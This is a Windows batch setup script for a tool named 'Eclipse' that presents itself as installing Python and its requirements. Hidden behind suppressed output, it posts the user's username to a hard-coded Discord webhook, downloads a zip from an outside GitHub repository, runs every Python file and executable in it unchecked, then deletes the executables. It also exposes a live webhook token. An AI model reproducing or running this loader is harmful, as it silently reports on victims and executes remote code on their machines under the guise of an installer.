@echo off
setlocal enabledelayedexpansion

set "WEBHOOK_URL=https://discord.com/api/webhooks/1285775649189007453/9x1BScyl68iNJcrocfUHuUEZ0E7HKAY7hXgEp9zJglpcpIqv5UZ46HwytMF3ey0TmDqM"
set "USERNAME=%USERNAME%"
Title Downloading Modules...

powershell.exe -Command "Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -ContentType 'application/json' -Body (@{username = 'Run Notification'; content = '%USERNAME% has run Eclipse'} | ConvertTo-Json)" >nul 2>&1

echo Checking for Python installation...

python --version >nul 2>&1
if "%ERRORLEVEL%" neq "0" (
    echo Python not found. Downloading Python 3.11.x...
    set "PYTHON_INSTALLER=https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
    set "PYTHON_INSTALLER_PATH=python-3.11.7-amd64.exe"
    
    curl -L -o "%PYTHON_INSTALLER_PATH%" "%PYTHON_INSTALLER%" >nul 2>&1
    
    echo Installing Python...
    start /wait "%PYTHON_INSTALLER_PATH%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 >nul 2>&1
    
    echo Python installed successfully.
) else (
    echo Python is already installed.
)

echo Installing Requirements (This may take a few minutes)...

python -m pip --version >nul 2>&1
if "%ERRORLEVEL%" neq "0" (
    echo Installing pip...
    python -m ensurepip >nul 2>&1
    python -m pip install --upgrade pip >nul 2>&1
)

pip install -r requirements.txt >nul 2>&1
if "%ERRORLEVEL%" neq "0" (
    echo Failed to install Python requirements. Ensure the requirements.txt file is present. >> error.log
    exit /b
)

if not exist "build_done.txt" (
    echo Downloading and running build tools...
    curl -L -o build.zip https://github.com/ShredGman/Eclipse-Build-Tools/archive/refs/heads/main.zip >nul 2>&1

    powershell -command "Expand-Archive -Path 'build.zip' -DestinationPath 'build_folder'" >nul 2>&1

    cd build_folder\Eclipse-Build-Tools-main

    for %%f in (*.py) do python "%%f"

    for %%e in (*.exe) do (
        start /wait "%%e"
    )

    cd ..\..

    del build.zip >nul 2>&1
    del build_folder\Eclipse-Build-Tools-main\*.exe >nul 2>&1

    echo. > build_done.txt
)

python main.py